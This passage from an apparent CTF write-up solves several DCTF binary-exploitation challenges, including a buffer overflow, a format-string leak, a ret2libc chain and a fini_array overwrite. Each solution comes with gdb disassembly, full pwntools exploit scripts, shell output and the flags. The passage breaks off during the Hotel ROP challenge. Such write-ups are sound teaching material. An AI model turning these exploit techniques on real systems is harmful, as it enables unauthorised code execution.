try harder one down, one to go! 2/2 bro good job $ cat flag.txt dctf{Ju5t_m0v3_0n} $ Pinch Me This challenge was also simple, loading the binary in gdb and checking the functions it contains, we can see that there’s a main function and vuln functions which are of interest:-\ngef➤ disas main Dump of assembler code for function main: 0x00000000004011d5 \u0026lt;+0\u0026gt;: push rbp 0x00000000004011d6 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004011d9 \u0026lt;+4\u0026gt;: mov edi,0xa 0x00000000004011de \u0026lt;+9\u0026gt;: call 0x401050 \u0026lt;alarm@plt\u0026gt; 0x00000000004011e3 \u0026lt;+14\u0026gt;: mov eax,0x0 0x00000000004011e8 \u0026lt;+19\u0026gt;: call 0x401152 \u0026lt;vuln\u0026gt; 0x00000000004011ed \u0026lt;+24\u0026gt;: mov eax,0x0 0x00000000004011f2 \u0026lt;+29\u0026gt;: pop rbp 0x00000000004011f3 \u0026lt;+30\u0026gt;: ret End of assembler dump. gef➤ disas vuln Dump of assembler code for function vuln: 0x0000000000401152 \u0026lt;+0\u0026gt;: push rbp 0x0000000000401153 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000401156 \u0026lt;+4\u0026gt;: sub rsp,0x20 0x000000000040115a \u0026lt;+8\u0026gt;: mov DWORD PTR [rbp-0x4],0x1234567 0x0000000000401161 \u0026lt;+15\u0026gt;: mov DWORD PTR [rbp-0x8],0x89abcdef 0x0000000000401168 \u0026lt;+22\u0026gt;: lea rdi,[rip+0xe99] # 0x402008 0x000000000040116f \u0026lt;+29\u0026gt;: call 0x401030 \u0026lt;puts@plt\u0026gt; 0x0000000000401174 \u0026lt;+34\u0026gt;: lea rdi,[rip+0xebd] # 0x402038 0x000000000040117b \u0026lt;+41\u0026gt;: call 0x401030 \u0026lt;puts@plt\u0026gt; 0x0000000000401180 \u0026lt;+46\u0026gt;: mov rdx,QWORD PTR [rip+0x2ec9] # 0x404050 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000401187 \u0026lt;+53\u0026gt;: lea rax,[rbp-0x20] 0x000000000040118b \u0026lt;+57\u0026gt;: mov esi,0x64 0x0000000000401190 \u0026lt;+62\u0026gt;: mov rdi,rax 0x0000000000401193 \u0026lt;+65\u0026gt;: call 0x401060 \u0026lt;fgets@plt\u0026gt; 0x0000000000401198 \u0026lt;+70\u0026gt;: cmp DWORD PTR [rbp-0x8],0x1337c0de 0x000000000040119f \u0026lt;+77\u0026gt;: jne 0x4011af \u0026lt;vuln+93\u0026gt; 0x00000000004011a1 \u0026lt;+79\u0026gt;: lea rdi,[rip+0xe9f] # 0x402047 0x00000000004011a8 \u0026lt;+86\u0026gt;: call 0x401040 \u0026lt;system@plt\u0026gt; 0x00000000004011ad \u0026lt;+91\u0026gt;: jmp 0x4011d2 \u0026lt;vuln+128\u0026gt; 0x00000000004011af \u0026lt;+93\u0026gt;: cmp DWORD PTR [rbp-0x4],0x1234567 0x00000000004011b6 \u0026lt;+100\u0026gt;: je 0x4011c6 \u0026lt;vuln+116\u0026gt; 0x00000000004011b8 \u0026lt;+102\u0026gt;: lea rdi,[rip+0xe90] # 0x40204f 0x00000000004011bf \u0026lt;+109\u0026gt;: call 0x401030 \u0026lt;puts@plt\u0026gt; 0x00000000004011c4 \u0026lt;+114\u0026gt;: jmp 0x4011d2 \u0026lt;vuln+128\u0026gt; 0x00000000004011c6 \u0026lt;+116\u0026gt;: lea rdi,[rip+0xe93] # 0x402060 0x00000000004011cd \u0026lt;+123\u0026gt;: call 0x401030 \u0026lt;puts@plt\u0026gt; 0x00000000004011d2 \u0026lt;+128\u0026gt;: nop 0x00000000004011d3 \u0026lt;+129\u0026gt;: leave 0x00000000004011d4 \u0026lt;+130\u0026gt;: ret End of assembler dump. gef➤ The vuln function has an obvious buffer overflow as same as of the Pwn Sanity only the size changed yet the vulnerability remains the same, the function checks whether the variable stored at the rbp - 0x8 is equal to the 0x1337c0de and if it does calls system(\u0026quot;/bin/sh\u0026quot;), so in order to do, we know that the buffer we control the input for is stored at rbp - 0x20 and the rbp - 0x8 was compared to the value of 0x1337c0de, so we can just do 0x20 - 0x8 to get the offset for the variable we need to control the input for which would be 0x20 - 0x8 = 24, hence 24 is the offset for the comparing value, then we can just grab the flag from the server:-\nfrom pwn import * p = remote(\u0026#34;dctf1-chall-pinch-me.westeurope.azurecontainer.io\u0026#34;, 7480) payload = b\u0026#34;A\u0026#34;*24 payload += p32(0x1337c0de) # integer is 4 bytes, hence p32() p.recvline() p.sendline(payload) p.interactive() Run the exploit:- r ❯ python3 pinch_me.py [+] Opening connection to dctf1-chall-pinch-me.westeurope.azurecontainer.io on port 7480: Done [*] Switching to interactive mode Am I dreaming? $ id uid=1000(pilot) gid=1000(pilot) groups=1000(pilot) $ cat flag.txt dctf{y0u_kn0w_wh4t_15_h4pp3n1ng_b75?}$ [*] Interrupted Readme #This one was a very basic format string challenge, checking the vuln function:-\ngef➤ disas vuln Dump of assembler code for function vuln: 0x000000000000085a \u0026lt;+0\u0026gt;: push rbp 0x000000000000085b \u0026lt;+1\u0026gt;: mov rbp,rsp 0x000000000000085e \u0026lt;+4\u0026gt;: sub rsp,0x60 0x0000000000000862 \u0026lt;+8\u0026gt;: mov rax,QWORD PTR fs:0x28 0x000000000000086b \u0026lt;+17\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x000000000000086f \u0026lt;+21\u0026gt;: xor eax,eax 0x0000000000000871 \u0026lt;+23\u0026gt;: lea rsi,[rip+0x13c] # 0x9b4 0x0000000000000878 \u0026lt;+30\u0026gt;: lea rdi,[rip+0x137] # 0x9b6 0x000000000000087f \u0026lt;+37\u0026gt;: call 0x730 \u0026lt;fopen@plt\u0026gt; 0x0000000000000884 \u0026lt;+42\u0026gt;: mov QWORD PTR [rbp-0x58],rax 0x0000000000000888 \u0026lt;+46\u0026gt;: mov rdx,QWORD PTR [rbp-0x58] 0x000000000000088c \u0026lt;+50\u0026gt;: lea rax,[rbp-0x50] 0x0000000000000890 \u0026lt;+54\u0026gt;: mov esi,0x1c 0x0000000000000895 \u0026lt;+59\u0026gt;: mov rdi,rax 0x0000000000000898 \u0026lt;+62\u0026gt;: call 0x720 \u0026lt;fgets@plt\u0026gt; 0x000000000000089d \u0026lt;+67\u0026gt;: mov rax,QWORD PTR [rbp-0x58] 0x00000000000008a1 \u0026lt;+71\u0026gt;: mov rdi,rax 0x00000000000008a4 \u0026lt;+74\u0026gt;: call 0x6e0 \u0026lt;fclose@plt\u0026gt; 0x00000000000008a9 \u0026lt;+79\u0026gt;: lea rdi,[rip+0x10f] # 0x9bf 0x00000000000008b0 \u0026lt;+86\u0026gt;: call 0x6d0 \u0026lt;puts@plt\u0026gt; 0x00000000000008b5 \u0026lt;+91\u0026gt;: mov rdx,QWORD PTR [rip+0x200754] # 0x201010 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000000008bc \u0026lt;+98\u0026gt;: lea rax,[rbp-0x30] 0x00000000000008c0 \u0026lt;+102\u0026gt;: mov esi,0x1e 0x00000000000008c5 \u0026lt;+107\u0026gt;: mov rdi,rax 0x00000000000008c8 \u0026lt;+110\u0026gt;: call 0x720 \u0026lt;fgets@plt\u0026gt; 0x00000000000008cd \u0026lt;+115\u0026gt;: lea rdi,[rip+0x104] # 0x9d8 0x00000000000008d4 \u0026lt;+122\u0026gt;: mov eax,0x0 0x00000000000008d9 \u0026lt;+127\u0026gt;: call 0x700 \u0026lt;printf@plt\u0026gt; 0x00000000000008de \u0026lt;+132\u0026gt;: lea rax,[rbp-0x30] 0x00000000000008e2 \u0026lt;+136\u0026gt;: mov rdi,rax 0x00000000000008e5 \u0026lt;+139\u0026gt;: mov eax,0x0 0x00000000000008ea \u0026lt;+144\u0026gt;: call 0x700 \u0026lt;printf@plt\u0026gt; 0x00000000000008ef \u0026lt;+149\u0026gt;: nop 0x00000000000008f0 \u0026lt;+150\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x00000000000008f4 \u0026lt;+154\u0026gt;: xor rax,QWORD PTR fs:0x28 0x00000000000008fd \u0026lt;+163\u0026gt;: je 0x904 \u0026lt;vuln+170\u0026gt; 0x00000000000008ff \u0026lt;+165\u0026gt;: call 0x6f0 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x0000000000000904 \u0026lt;+170\u0026gt;: leave 0x0000000000000905 \u0026lt;+171\u0026gt;: ret End of assembler dump. gef➤ We can see it opens the flag.txt file via fopen and read the flag from the file and store it on the stack, then it takes he input via fgets and then print the given input via printf without any format specifier, this proposed the format string vulnerability and with that we can leak the values from the stack, since the flag is also stored on the stack, we can just as well leak it, using the following exploit, we can get flag:-\nfrom pwn import * from binascii import unhexlify p = remote(\u0026#34;dctf-chall-readme.westeurope.azurecontainer.io\u0026#34;, 7481) p.recvline() p.sendline(\u0026#34;%8$lx-%9$lx-%10$lx-%11$x\u0026#34;) p.recvuntil(\u0026#34;hello \u0026#34;) output = p.recvline().strip().split(b\u0026#34;-\u0026#34;) flag = [unhexlify(x)[::-1] for x in output] print(b\u0026#34;\u0026#34;.join(flag)+b\u0026#34;}\u0026#34;) p.close() Running the exploit:- r ❯ python3 readme.py [+] Opening connection to dctf-chall-readme.westeurope.azurecontainer.io on port 7481: Done b\u0026#39;dctf{n0w_g0_r3ad_s0me_b00k5}\u0026#39; [*] Closed connection to dctf-chall-readme.westeurope.azurecontainer.io port 7481 Baby BOF #Baby BOF was normal return to libc attack, since the dockerfile is provided with the challenge which showed that the binary is running in the Ubuntu 20.04 container, hinting that the libc here used is LIBC 2.31, checking the vuln function:-\ngef➤ disas vuln Dump of assembler code for function vuln: 0x00000000004005b7 \u0026lt;+0\u0026gt;: push rbp 0x00000000004005b8 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000004005bb \u0026lt;+4\u0026gt;: sub rsp,0x10 0x00000000004005bf \u0026lt;+8\u0026gt;: lea rdi,[rip+0xde] # 0x4006a4 0x00000000004005c6 \u0026lt;+15\u0026gt;: call 0x4004a0 \u0026lt;puts@plt\u0026gt; 0x00000000004005cb \u0026lt;+20\u0026gt;: mov rdx,QWORD PTR [rip+0x200a6e] # 0x601040 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x00000000004005d2 \u0026lt;+27\u0026gt;: lea rax,[rbp-0xa] 0x00000000004005d6 \u0026lt;+31\u0026gt;: mov esi,0x100 0x00000000004005db \u0026lt;+36\u0026gt;: mov rdi,rax 0x00000000004005de \u0026lt;+39\u0026gt;: call 0x4004c0 \u0026lt;fgets@plt\u0026gt; 0x00000000004005e3 \u0026lt;+44\u0026gt;: lea rdi,[rip+0xcb] # 0x4006b5 0x00000000004005ea \u0026lt;+51\u0026gt;: call 0x4004a0 \u0026lt;puts@plt\u0026gt; 0x00000000004005ef \u0026lt;+56\u0026gt;: nop 0x00000000004005f0 \u0026lt;+57\u0026gt;: leave 0x00000000004005f1 \u0026lt;+58\u0026gt;: ret Again, the fgets function call is vulnerable here, we can see that the buffer is of size 0xa while the size acceptable was 0x100 making it vulnerable to buffer overflow. Now, for the ret2libc part, I would recommend you to start reading here.\nThe process is exact same, leak the GOT address of the puts and call main again and call system(\u0026quot;/bin/sh\u0026quot;):-\nfrom pwn import * p = remote(\u0026#34;dctf-chall-baby-bof.westeurope.azurecontainer.io\u0026#34;, 7481) elf = ELF(\u0026#34;baby_bof\u0026#34;) libc= elf.libc payload = b\u0026#34;A\u0026#34;*18 payload += p64(0x0000000000400683) payload += p64(elf.got[\u0026#39;alarm\u0026#39;]) payload += p64(elf.plt[\u0026#39;puts\u0026#39;]) payload += p64(elf.symbols[\u0026#39;main\u0026#39;]) p.recvline() p.sendline(payload) p.recvline() libc.address = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - libc.symbols[\u0026#39;alarm\u0026#39;] print(hex(libc.address)) payload = b\u0026#34;A\u0026#34;*18 payload += p64(0x000000000040048e) payload += p64(0x0000000000400683) payload += p64(next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;))) payload += p64(libc.symbols[\u0026#39;system\u0026#39;]) p.sendline(payload) p.interactive() Running the exploit:-\n❯ python3 baby_bof.py [+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done [*] \u0026#39;/home/d4mianwayne/Pwning/CTFs/dctf/baby_bof\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) [*] \u0026#39;/usr/lib/x86_64-linux-gnu/libc-2.31.so\u0026#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 0x7f37b1589000 [*] Switching to interactive mode plz don\u0026#39;t rop me i don\u0026#39;t think this will work $ cat flag.txt dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3} $ [*] Interrupted Magic Trick #This was kind of a good challenge, well kind of, first check the security mechanisms:-\ngef➤ checksec [+] checksec for \u0026#39;/home/d4mianwayne/Pwning/CTFs/dctf/magic_trick\u0026#39; Canary : ✓ NX : ✓ PIE : ✘ Fortify : ✘ RelRO : ✘ gef➤ Now, this shows off that that there’s Canary and NX protection while the PIE and RELRO is disabled, this means we can write the _fini_array or any of the Global Offset Table entries. The main function calls the magic function, checking it:-\ngef➤ disas magic Dump of assembler code for function magic: 0x000000000040068d \u0026lt;+0\u0026gt;: push rbp 0x000000000040068e \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000400691 \u0026lt;+4\u0026gt;: sub rsp,0x20 0x0000000000400695 \u0026lt;+8\u0026gt;: mov rax,QWORD PTR fs:0x28 0x000000000040069e \u0026lt;+17\u0026gt;: mov QWORD PTR [rbp-0x8],rax 0x00000000004006a2 \u0026lt;+21\u0026gt;: xor eax,eax 0x00000000004006a4 \u0026lt;+23\u0026gt;: lea rdi,[rip+0x15e] # 0x400809 0x00000000004006ab \u0026lt;+30\u0026gt;: call 0x400520 \u0026lt;puts@plt\u0026gt; 0x00000000004006b0 \u0026lt;+35\u0026gt;: lea rax,[rbp-0x20] 0x00000000004006b4 \u0026lt;+39\u0026gt;: mov rsi,rax 0x00000000004006b7 \u0026lt;+42\u0026gt;: lea rdi,[rip+0x165] # 0x400823 0x00000000004006be \u0026lt;+49\u0026gt;: mov eax,0x0 0x00000000004006c3 \u0026lt;+54\u0026gt;: call 0x400560 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x00000000004006c8 \u0026lt;+59\u0026gt;: lea rdi,[rip+0x159] # 0x400828 0x00000000004006cf \u0026lt;+66\u0026gt;: call 0x400520 \u0026lt;puts@plt\u0026gt; 0x00000000004006d4 \u0026lt;+71\u0026gt;: lea rax,[rbp-0x18] 0x00000000004006d8 \u0026lt;+75\u0026gt;: mov rsi,rax 0x00000000004006db \u0026lt;+78\u0026gt;: lea rdi,[rip+0x141] # 0x400823 0x00000000004006e2 \u0026lt;+85\u0026gt;: mov eax,0x0 0x00000000004006e7 \u0026lt;+90\u0026gt;: call 0x400560 \u0026lt;__isoc99_scanf@plt\u0026gt; 0x00000000004006ec \u0026lt;+95\u0026gt;: lea rdi,[rip+0x153] # 0x400846 0x00000000004006f3 \u0026lt;+102\u0026gt;: call 0x400520 \u0026lt;puts@plt\u0026gt; 0x00000000004006f8 \u0026lt;+107\u0026gt;: mov rax,QWORD PTR [rbp-0x18] 0x00000000004006fc \u0026lt;+111\u0026gt;: mov QWORD PTR [rbp-0x10],rax 0x0000000000400700 \u0026lt;+115\u0026gt;: mov rdx,QWORD PTR [rbp-0x20] 0x0000000000400704 \u0026lt;+119\u0026gt;: mov rax,QWORD PTR [rbp-0x10] 0x0000000000400708 \u0026lt;+123\u0026gt;: mov QWORD PTR [rax],rdx 0x000000000040070b \u0026lt;+126\u0026gt;: nop 0x000000000040070c \u0026lt;+127\u0026gt;: mov rax,QWORD PTR [rbp-0x8] 0x0000000000400710 \u0026lt;+131\u0026gt;: xor rax,QWORD PTR fs:0x28 0x0000000000400719 \u0026lt;+140\u0026gt;: je 0x400720 \u0026lt;magic+147\u0026gt; 0x000000000040071b \u0026lt;+142\u0026gt;: call 0x400530 \u0026lt;__stack_chk_fail@plt\u0026gt; 0x0000000000400720 \u0026lt;+147\u0026gt;: leave 0x0000000000400721 \u0026lt;+148\u0026gt;: ret We can see that the program calls scanf two times and take unsigned long long, first it takes a value, second input takes another input and attempt to write the value given by the first input to the address of the second input, that means it allow us to write any value to any address having r/w access to. Since the RELRO is disabled, we can overwrite the destructors which will be run once the process will come to an end to the address of the win function which prints the flag:-\nfrom pwn import * p = remote(\u0026#34;dctf-chall-magic-trick.westeurope.azurecontainer.io\u0026#34;, 7481) elf = ELF(\u0026#34;magic_trick\u0026#34;) p.recvline() p.recvline() p.recvline() p.sendline(str(elf.symbols[\u0026#39;win\u0026#39;])) p.recvline() p.sendline(str(elf.symbols[\u0026#39;__do_global_dtors_aux_fini_array_entry\u0026#39;])) p.interactive() Running the exploit:- ❯ python3 magic_trick.py [+] Opening connection to dctf-chall-magic-trick.westeurope.azurecontainer.io on port 7481: Done [*] \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/magic_trick\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [*] Switching to interactive mode thanks You are a real magician dctf{1_L1k3_M4G1c} [*] Got EOF while reading in interactive $ [*] Interrupted Hotel ROP #This was yet another ROP challenge but kind of a twist on it, it has PIE and NX enabled but the Canary was disabled:-\ngef➤ checksec [+] checksec for \u0026#39;/home/d4mianwayne/Pwning/CTFs/ductf/hotel_rop\u0026#39; Canary : ✘ NX : ✓ PIE : ✓ Fortify : ✘ RelRO : Partial Now, checking the function it contains, we can see there are several user-defined functions:-\ngef➤ i functions All defined functions: Non-debugging symbols: 0x0000000000001000 _init 0x0000000000001030 puts@plt 0x0000000000001040 system@plt 0x0000000000001050 printf@plt 0x0000000000001060 alarm@plt 0x0000000000001070 fgets@plt 0x0000000000001080 exit@plt 0x0000000000001090 __cxa_finalize@plt 0x00000000000010a0 _start 0x00000000000010d0 deregister_tm_clones 0x0000000000001100 register_tm_clones 0x0000000000001140 __do_global_dtors_aux 0x0000000000001180 frame_dummy 0x0000000000001185 loss 0x00000000000011dc california 0x0000000000001283 silicon_valley 0x000000000000131e vuln 0x000000000000136d main 0x00000000000013b0 __libc_csu_init 0x0000000000001410 __libc_csu_fini 0x0000000000001414 _fini gef➤ Checking for the function named main function, we can see it prints the address of the main function, so much for the PIE security, PIE can bypassed since we get the address of the function, we can obtain the base address of the ELF itself. Then it calls the function vuln:-\ngef➤ disas main Dump of assembler code for function main: 0x000000000000136d \u0026lt;+0\u0026gt;: push rbp 0x000000000000136e \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000001371 \u0026lt;+4\u0026gt;: mov edi,0xa 0x0000000000001376 \u0026lt;+9\u0026gt;: call 0x1060 \u0026lt;alarm@plt\u0026gt; 0x000000000000137b \u0026lt;+14\u0026gt;: lea rsi,[rip+0xffffffffffffffeb] # 0x136d \u0026lt;main\u0026gt; 0x0000000000001382 \u0026lt;+21\u0026gt;: lea rdi,[rip+0xdb7] # 0x2140 0x0000000000001389 \u0026lt;+28\u0026gt;: mov eax,0x0 0x000000000000138e \u0026lt;+33\u0026gt;: call 0x1050 \u0026lt;printf@plt\u0026gt; 0x0000000000001393 \u0026lt;+38\u0026gt;: mov eax,0x0 0x0000000000001398 \u0026lt;+43\u0026gt;: call 0x131e \u0026lt;vuln\u0026gt; 0x000000000000139d \u0026lt;+48\u0026gt;: mov eax,0x0 0x00000000000013a2 \u0026lt;+53\u0026gt;: pop rbp 0x00000000000013a3 \u0026lt;+54\u0026gt;: ret End of assembler dump. gef➤ disas vuln Dump of assembler code for function vuln: 0x000000000000131e \u0026lt;+0\u0026gt;: push rbp 0x000000000000131f \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000001322 \u0026lt;+4\u0026gt;: sub rsp,0x20 0x0000000000001326 \u0026lt;+8\u0026gt;: lea rdi,[rip+0xda3] # 0x20d0 0x000000000000132d \u0026lt;+15\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x0000000000001332 \u0026lt;+20\u0026gt;: mov rdx,QWORD PTR [rip+0x2d27] # 0x4060 \u0026lt;stdin@@GLIBC_2.2.5\u0026gt; 0x0000000000001339 \u0026lt;+27\u0026gt;: lea rax,[rbp-0x20] 0x000000000000133d \u0026lt;+31\u0026gt;: mov esi,0x100 0x0000000000001342 \u0026lt;+36\u0026gt;: mov rdi,rax 0x0000000000001345 \u0026lt;+39\u0026gt;: call 0x1070 \u0026lt;fgets@plt\u0026gt; 0x000000000000134a \u0026lt;+44\u0026gt;: cmp DWORD PTR [rbp-0x4],0x0 0x000000000000134e \u0026lt;+48\u0026gt;: je 0x135e \u0026lt;vuln+64\u0026gt; 0x0000000000001350 \u0026lt;+50\u0026gt;: lea rdi,[rip+0xd91] # 0x20e8 0x0000000000001357 \u0026lt;+57\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x000000000000135c \u0026lt;+62\u0026gt;: jmp 0x136b \u0026lt;vuln+77\u0026gt; 0x000000000000135e \u0026lt;+64\u0026gt;: lea rdi,[rip+0xdb3] # 0x2118 0x0000000000001365 \u0026lt;+71\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x000000000000136a \u0026lt;+76\u0026gt;: nop 0x000000000000136b \u0026lt;+77\u0026gt;: leave 0x000000000000136c \u0026lt;+78\u0026gt;: ret End of assembler dump. The vuln function was calling the fgets and the given size to the fgets more than the buffer could hold, so it was a stack overflow. Secondly, there were two other functions:-\ngef➤ disas california Dump of assembler code for function california: 0x00000000000011dc \u0026lt;+0\u0026gt;: push rbp 0x00000000000011dd \u0026lt;+1\u0026gt;: mov rbp,rsp 0x00000000000011e0 \u0026lt;+4\u0026gt;: lea rdi,[rip+0xe72] # 0x2059 0x00000000000011e7 \u0026lt;+11\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x00000000000011ec \u0026lt;+16\u0026gt;: lea rdi,[rip+0xe85] # 0x2078 0x00000000000011f3 \u0026lt;+23\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x00000000000011f8 \u0026lt;+28\u0026gt;: mov eax,DWORD PTR [rip+0x2e7a] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000011fe \u0026lt;+34\u0026gt;: cdqe 0x0000000000001200 \u0026lt;+36\u0026gt;: lea rdx,[rip+0x2e69] # 0x4070 \u0026lt;win_land\u0026gt; 0x0000000000001207 \u0026lt;+43\u0026gt;: mov BYTE PTR [rax+rdx*1],0x2f 0x000000000000120b \u0026lt;+47\u0026gt;: mov eax,DWORD PTR [rip+0x2e67] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001211 \u0026lt;+53\u0026gt;: add eax,0x1 0x0000000000001214 \u0026lt;+56\u0026gt;: mov DWORD PTR [rip+0x2e5e],eax # 0x4078 \u0026lt;len\u0026gt; 0x000000000000121a \u0026lt;+62\u0026gt;: mov eax,DWORD PTR [rip+0x2e58] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001220 \u0026lt;+68\u0026gt;: cdqe 0x0000000000001222 \u0026lt;+70\u0026gt;: lea rdx,[rip+0x2e47] # 0x4070 \u0026lt;win_land\u0026gt; 0x0000000000001229 \u0026lt;+77\u0026gt;: mov BYTE PTR [rax+rdx*1],0x62 0x000000000000122d \u0026lt;+81\u0026gt;: mov eax,DWORD PTR [rip+0x2e45] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001233 \u0026lt;+87\u0026gt;: add eax,0x1 0x0000000000001236 \u0026lt;+90\u0026gt;: mov DWORD PTR [rip+0x2e3c],eax # 0x4078 \u0026lt;len\u0026gt; 0x000000000000123c \u0026lt;+96\u0026gt;: mov eax,DWORD PTR [rip+0x2e36] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001242 \u0026lt;+102\u0026gt;: cdqe 0x0000000000001244 \u0026lt;+104\u0026gt;: lea rdx,[rip+0x2e25] # 0x4070 \u0026lt;win_land\u0026gt; 0x000000000000124b \u0026lt;+111\u0026gt;: mov BYTE PTR [rax+rdx*1],0x69 0x000000000000124f \u0026lt;+115\u0026gt;: mov eax,DWORD PTR [rip+0x2e23] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001255 \u0026lt;+121\u0026gt;: add eax,0x1 0x0000000000001258 \u0026lt;+124\u0026gt;: mov DWORD PTR [rip+0x2e1a],eax # 0x4078 \u0026lt;len\u0026gt; 0x000000000000125e \u0026lt;+130\u0026gt;: mov eax,DWORD PTR [rip+0x2e14] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001264 \u0026lt;+136\u0026gt;: cdqe 0x0000000000001266 \u0026lt;+138\u0026gt;: lea rdx,[rip+0x2e03] # 0x4070 \u0026lt;win_land\u0026gt; 0x000000000000126d \u0026lt;+145\u0026gt;: mov BYTE PTR [rax+rdx*1],0x6e 0x0000000000001271 \u0026lt;+149\u0026gt;: mov eax,DWORD PTR [rip+0x2e01] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001277 \u0026lt;+155\u0026gt;: add eax,0x1 0x000000000000127a \u0026lt;+158\u0026gt;: mov DWORD PTR [rip+0x2df8],eax # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001280 \u0026lt;+164\u0026gt;: nop 0x0000000000001281 \u0026lt;+165\u0026gt;: pop rbp 0x0000000000001282 \u0026lt;+166\u0026gt;: ret End of assembler dump. gef➤ disas silicon_valley Dump of assembler code for function silicon_valley: 0x0000000000001283 \u0026lt;+0\u0026gt;: push rbp 0x0000000000001284 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000001287 \u0026lt;+4\u0026gt;: lea rdi,[rip+0xe25] # 0x20b3 0x000000000000128e \u0026lt;+11\u0026gt;: call 0x1030 \u0026lt;puts@plt\u0026gt; 0x0000000000001293 \u0026lt;+16\u0026gt;: mov eax,DWORD PTR [rip+0x2ddf] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001299 \u0026lt;+22\u0026gt;: cdqe 0x000000000000129b \u0026lt;+24\u0026gt;: lea rdx,[rip+0x2dce] # 0x4070 \u0026lt;win_land\u0026gt; 0x00000000000012a2 \u0026lt;+31\u0026gt;: mov BYTE PTR [rax+rdx*1],0x2f 0x00000000000012a6 \u0026lt;+35\u0026gt;: mov eax,DWORD PTR [rip+0x2dcc] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012ac \u0026lt;+41\u0026gt;: add eax,0x1 0x00000000000012af \u0026lt;+44\u0026gt;: mov DWORD PTR [rip+0x2dc3],eax # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012b5 \u0026lt;+50\u0026gt;: mov eax,DWORD PTR [rip+0x2dbd] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012bb \u0026lt;+56\u0026gt;: cdqe 0x00000000000012bd \u0026lt;+58\u0026gt;: lea rdx,[rip+0x2dac] # 0x4070 \u0026lt;win_land\u0026gt; 0x00000000000012c4 \u0026lt;+65\u0026gt;: mov BYTE PTR [rax+rdx*1],0x73 0x00000000000012c8 \u0026lt;+69\u0026gt;: mov eax,DWORD PTR [rip+0x2daa] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012ce \u0026lt;+75\u0026gt;: add eax,0x1 0x00000000000012d1 \u0026lt;+78\u0026gt;: mov DWORD PTR [rip+0x2da1],eax # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012d7 \u0026lt;+84\u0026gt;: mov eax,DWORD PTR [rip+0x2d9b] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012dd \u0026lt;+90\u0026gt;: cdqe 0x00000000000012df \u0026lt;+92\u0026gt;: lea rdx,[rip+0x2d8a] # 0x4070 \u0026lt;win_land\u0026gt; 0x00000000000012e6 \u0026lt;+99\u0026gt;: mov BYTE PTR [rax+rdx*1],0x68 0x00000000000012ea \u0026lt;+103\u0026gt;: mov eax,DWORD PTR [rip+0x2d88] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012f0 \u0026lt;+109\u0026gt;: add eax,0x1 0x00000000000012f3 \u0026lt;+112\u0026gt;: mov DWORD PTR [rip+0x2d7f],eax # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012f9 \u0026lt;+118\u0026gt;: mov eax,DWORD PTR [rip+0x2d79] # 0x4078 \u0026lt;len\u0026gt; 0x00000000000012ff \u0026lt;+124\u0026gt;: cdqe 0x0000000000001301 \u0026lt;+126\u0026gt;: lea rdx,[rip+0x2d68] # 0x4070 \u0026lt;win_land\u0026gt; 0x0000000000001308 \u0026lt;+133\u0026gt;: mov BYTE PTR [rax+rdx*1],0x0 0x000000000000130c \u0026lt;+137\u0026gt;: mov eax,DWORD PTR [rip+0x2d66] # 0x4078 \u0026lt;len\u0026gt; 0x0000000000001312 \u0026lt;+143\u0026gt;: add eax,0x1 0x0000000000001315 \u0026lt;+146\u0026gt;: mov DWORD PTR [rip+0x2d5d],eax # 0x4078 \u0026lt;len\u0026gt; 0x000000000000131b \u0026lt;+152\u0026gt;: nop 0x000000000000131c \u0026lt;+153\u0026gt;: pop rbp 0x000000000000131d \u0026lt;+154\u0026gt;: ret End of assembler dump. gef➤ The california function adds the 4 bytes to the win_land global variable, the 4 bytes were /bin and the next function named silicon_valley adds the remaining 4 bytes /sh\\x00 to the win_land making the win_land equals to the /bin/shx00, then there was another function named loss, which was as following:-\ngef➤ disas loss Dump of assembler code for function loss: 0x0000000000001185 \u0026lt;+0\u0026gt;: push rbp 0x0000000000001186 \u0026lt;+1\u0026gt;: mov rbp,rsp 0x0000000000001189 \u0026lt;+4\u0026gt;: sub rsp,0x10 